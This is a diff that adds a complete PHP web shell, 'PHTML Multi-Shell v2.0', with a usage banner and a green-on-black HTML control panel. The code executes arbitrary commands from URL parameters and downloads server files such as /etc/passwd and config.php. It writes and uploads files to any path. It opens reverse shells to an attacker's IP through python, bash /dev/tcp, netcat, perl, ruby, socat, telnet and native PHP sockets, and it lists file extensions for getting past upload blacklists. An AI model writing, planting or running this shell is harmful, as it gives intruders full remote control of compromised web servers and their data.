@@ -1,0 +1,156 @@
+<?php
+/*
+╔══════════════════════════════════════════════════════════════════════════
+║                         PHTML Multi-Shell v2.0                           
+╠══════════════════════════════════════════════════════════════════════════
+║ COMPATIBLE EXTENSIONS (if blacklist bypass needed):                     
+║   .phtml .pht .php3 .php4 .php5 .php7 .phps .phar .inc                  
+║   Case variations: .PhP .pHtml .PHTML (on case-insensitive systems)     
+║                                                                          
+║ USAGE:                                                                   
+║   ?c=id                          - Execute command                       
+║   ?r=IP:PORT&m=auto             - Auto-try all reverse shells          
+║   ?r=IP:PORT&m=METHOD           - Specific: python|bash|nc|perl|php    
+║   ?d=/etc/passwd                - Download file                         
+║   ?w=/tmp/file&data=content     - Write file                            
+║   Upload form                    - Upload files (optional custom path)  
+║                                                                          
+║ REVERSE SHELL METHODS:                                                  
+║   auto     - Try all methods (recommended)                              
+║   python   - Python3 socket (most reliable)                             
+║   python2  - Python2 fallback                                           
+║   bash     - Bash /dev/tcp (no dependencies)                            
+║   sh       - Bourne shell fallback                                      
+║   nc       - Netcat traditional                                         
+║   nc_alt   - Netcat alternative syntax                                  
+║   ncat     - Nmap's ncat                                                
+║   perl     - Perl socket                                                
+║   ruby     - Ruby socket                                                
+║   php      - Native PHP socket                                          
+║   socat    - Socat exec                                                 
+║   telnet   - Telnet fallback                                            
+║                                                                          
+║ EXAMPLES:                                                               
+║   shell.phtml?c=whoami                                                   
+║   shell.phtml?r=10.10.10.10:443&m=auto                                 
+║   shell.phtml?d=/var/www/config.php                                     
+║   shell.phtml?w=/tmp/.shell&data=<?php system($_GET['x']); ?>          
+╚══════════════════════════════════════════════════════════════════════════
+*/
+
+@error_reporting(0);
+@set_time_limit(0);
+@ini_set('max_execution_time', 0);
+
+if(isset($_GET['c'])) {
+    echo "<pre>" . shell_exec($_GET['c'] . " 2>&1") . "</pre>";
+    die();
+}
+
+if(isset($_GET['r'])) {
+    list($ip, $port) = explode(':', $_GET['r']);
+    $m = isset($_GET['m']) ? $_GET['m'] : 'auto';
+    
+    // Find bash path
+    $bash = '/bin/bash';
+    foreach(['/bin/bash','/usr/bin/bash','/usr/local/bin/bash','/system/bin/bash'] as $b) {
+        if(file_exists($b)) { $bash = $b; break; }
+    }
+    
+    $methods = array(
+        'python' => "/usr/bin/python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\"$bash\",\"-i\"])'",
+        'python2' => "/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));[os.dup2(s.fileno(),f)for f in(0,1,2)];subprocess.call([\"$bash\",\"-i\"])'",
+        'bash' => "$bash -c '$bash -i >& /dev/tcp/$ip/$port 0>&1'",
+        'sh' => "/bin/sh -c '/bin/sh -i >& /dev/tcp/$ip/$port 0>&1'",
+        'nc' => "/bin/nc $ip $port -e $bash",
+        'nc_alt' => "/bin/nc -e $bash $ip $port",
+        'ncat' => "/usr/bin/ncat $ip $port -e $bash",
+        'perl' => "/usr/bin/perl -e 'use Socket;\$i=\"$ip\";\$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in(\$p,inet_aton(\$i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"$bash -i\");'",
+        'ruby' => "/usr/bin/ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"$ip\",$port);loop{c.gets.chomp!;(exit! if $_==\"exit\");(\$_=~/cd (.+)/i?(Dir.chdir(\$1)):(IO.popen(\$_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{\$_}\"}'",
+        'telnet' => "(telnet $ip $port||while :;do sh&&break;done)2>&1|telnet $ip $((port+1))>/dev/null 2>&1&",
+        'socat' => "/usr/bin/socat exec:'$bash -li',pty,stderr,setsid,sigint,sane tcp:$ip:$port",
+        'php' => 'native_php'
+    );
+    
+    if($m == 'auto') {
+        // Try each method until one works
+        foreach($methods as $name => $cmd) {
+            if($cmd == 'native_php') {
+                $s = @fsockopen($ip, $port);
+                if($s) {
+                    @proc_open($bash . ' -i', array(0=>$s,1=>$s,2=>$s), $p);
+                    die();
+                }
+            } else {
+                @shell_exec($cmd . ' 2>/dev/null &');
+                usleep(100000); // 0.1s delay between attempts
+            }
+        }
+    } else {
+        // Use specific method
+        if($methods[$m] == 'native_php') {
+            $s = fsockopen($ip, $port);
+            proc_open($bash . ' -i', array(0=>$s,1=>$s,2=>$s), $p);
+        } else {
+            shell_exec($methods[$m]);
+        }
+    }
+    die();
+}
+
+if(isset($_GET['d'])) {
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename="'.basename($_GET['d']).'"');
+    readfile($_GET['d']);
+    die();
+}
+
+if(isset($_GET['u']) && isset($_FILES['f'])) {
+    $dest = isset($_GET['path']) ? $_GET['path'] : $_FILES['f']['name'];
+    move_uploaded_file($_FILES['f']['tmp_name'], $dest);
+    echo "Uploaded to: $dest";
+    die();
+}
+
+if(isset($_GET['w'])) {
+    // Write file: ?w=/path/file&data=content
+    file_put_contents($_GET['w'], $_GET['data']);
+    echo "Written to: " . $_GET['w'];
+    die();
+}
+
+if(isset($_GET['help'])) {
+    highlight_file(__FILE__);
+    die();
+}
+?>
+<!DOCTYPE html>
+<html><head><style>
+body{font-family:monospace;background:#1e1e1e;color:#00ff00;padding:20px}
+input,select{background:#2d2d2d;color:#00ff00;border:1px solid #00ff00;padding:5px}
+a{color:#00ff00;text-decoration:none;padding:5px;border:1px solid #00ff00;margin:2px}
+a:hover{background:#00ff00;color:#000}
+h3{color:#00ff00}
+</style></head><body>
+<h3>PHTML Multi-Shell v2.0</h3>
+<p><a href="?help">View Full Help / Source</a></p>
+<hr>
+<form method=post enctype=multipart/form-data>
+File: <input type=file name=f> Path: <input name=path placeholder="optional" size=30>
+<input type=hidden name=u value=1><input type=submit value="Upload">
+</form>
+<form method=get>
+CMD: <input name=c size=60 placeholder="command" autofocus><input type=submit value="Execute">
+</form>
+<hr>
+<b>Reverse Shell:</b><br>
+<a href="?r=YOUR_IP:443&m=auto">AUTO-TRY-ALL</a> | 
+<a href="?r=YOUR_IP:443&m=python">Python3</a> | 
+<a href="?r=YOUR_IP:443&m=bash">Bash</a> | 
+<a href="?r=YOUR_IP:443&m=nc">Netcat</a> | 
+<a href="?r=YOUR_IP:443&m=perl">Perl</a> | 
+<a href="?r=YOUR_IP:443&m=php">PHP</a> | 
+<a href="?r=YOUR_IP:443&m=ruby">Ruby</a>
+<hr>
+<small>Compatible extensions: .phtml .pht .php3 .php4 .php5 .php7 .phps .phar .inc | Case variants: .PhP .pHtml</small>
+</body></html>
